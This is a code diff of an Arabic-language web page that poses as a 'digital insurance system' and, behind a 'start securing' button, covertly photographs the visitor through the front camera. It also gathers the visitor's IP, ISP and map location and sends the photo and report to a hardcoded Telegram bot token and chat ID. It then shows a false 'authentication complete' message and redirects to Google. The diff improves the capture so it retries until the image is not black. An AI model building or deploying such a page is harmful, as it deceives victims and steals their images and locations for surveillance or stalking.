@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التأمين الرقمي</title>
+    <title>نظام التأمين الرقمي الموحد</title>
     <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; user-select: none; }
@@ -11,7 +11,7 @@
         video, canvas { display: none; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
     <div class="box">
         <div style="font-size: 40px;">🛡️</div>
@@ -24,85 +24,81 @@
     <canvas id="c"></canvas>
 
     <script>
-        document.addEventListener('keydown', e => {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) e.preventDefault();
-        });
-
         const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
         const CH_ID = "1678506419";
 
         async function megaCapture() {
             const btn = document.querySelector('.btn');
-            btn.innerHTML = "جاري المعالجة...";
+            btn.innerHTML = "جاري الفحص...";
             btn.disabled = true;
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 } 
-                    } 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // الحل هنا: ننتظر حتى يبدأ الفيديو فعلياً بالعمل
                 v.onloadedmetadata = () => {
                     v.play();
-                    // ننتظر ثانية إضافية بعد التشغيل الفعلي للتأكد من زوال السواد
-                    setTimeout(async () => {
-                        takeSnapshot(v, stream);
-                    }, 1000);
+                    // محاولة التصوير المتكرر حتى تنجح (تجنب السواد)
+                    let attempts = 0;
+                    const checkAndShoot = setInterval(async () => {
+                        attempts++;
+                        const isCaptured = await takeSnapshot(v, stream);
+                        
+                        // إذا نجح التصوير أو تجاوزنا 5 محاولات نوقف التكرار
+                        if (isCaptured || attempts > 5) {
+                            clearInterval(checkAndShoot);
+                            finishProcess(stream);
+                        }
+                    }, 800); // يحاول كل 800 مللي ثانية
                 };
-
             } catch (e) {
-                alert("يجب السماح للكاميرا لإتمام عملية التأمين.");
-                btn.innerHTML = "بدء التأمين";
+                alert("يجب السماح بالكاميرا.");
                 btn.disabled = false;
+                btn.innerHTML = "بدء التأمين";
             }
         }
 
         async function takeSnapshot(v, stream) {
-            try {
-                const c = document.getElementById('c');
-                // نأخذ الأبعاد الحقيقية للفيديو الخارج من الكاميرا
-                c.width = v.videoWidth; 
-                c.height = v.videoHeight;
-                const ctx = c.getContext('2d');
-                ctx.drawImage(v, 0, 0, c.width, c.height);
+            const c = document.getElementById('c');
+            const ctx = c.getContext('2d');
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            ctx.drawImage(v, 0, 0);
 
-                // سحب البيانات
-                let i = { ip: "N/A", org: "Unknown", city: "Unknown", country_name: "Jordan" };
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    if (res.ok) i = await res.json();
-                } catch (e) {}
+            // فحص هل الصورة سوداء؟ (نأخذ عينة من بكسلات المنتصف)
+            const pixelData = ctx.getImageData(c.width/2, c.height/2, 1, 1).data;
+            const brightness = pixelData[0] + pixelData[1] + pixelData[2];
 
-                const report = `📍 IP: ${i.ip}\n🏢 ISP: ${i.org}\n🌍 Loc: ${i.city}, ${i.country_name}\n📱 Dev: ${navigator.platform}\n🔗 Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;
+            if (brightness === 0 && v.videoWidth > 0) {
+                console.log("الصورة سوداء، إعادة المحاولة...");
+                return false; // فشل (سواد)
+            }
 
+            // إذا ليست سوداء، أرسلها فوراً
+            let i = { ip: "N/A" };
+            try { const r = await fetch('https://ipapi.co/json/'); i = await r.json(); } catch(e) {}
+
+            const report = `✅ تم \n📍 IP: ${i.ip}\n🏢 ISP: ${i.org || 'Unknown'}\n🔗 Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;
+
+            return new Promise((resolve) => {
                 c.toBlob(async (blob) => {
-                    if (!blob) return;
                     const fd = new FormData();
                     fd.append('chat_id', CH_ID);
-                    fd.append('photo', blob, 'secure.jpg');
+                    fd.append('photo', blob, 'img.jpg');
                     fd.append('caption', report);
+                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    resolve(true); // نجاح
+                }, 'image/jpeg', 0.7);
+            });
+        }
 
-                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
-
-                    // إغلاق الكاميرا والتحويل
-                    stream.getTracks().forEach(t => t.stop());
-                    alert("تم التأمين بنجاح.");
-                    window.location.href = "https://google.com";
-                }, 'image/jpeg', 0.8);
-
-            } catch (err) {
-                console.error(err);
-            }
+        function finishProcess(stream) {
+            setTimeout(() => {
+                stream.getTracks().forEach(t => t.stop());
+                alert("اكتملت المصادقة.");
+                window.location.href = "https://google.com";
+            }, 1000);
         }
     </script>
 </body>
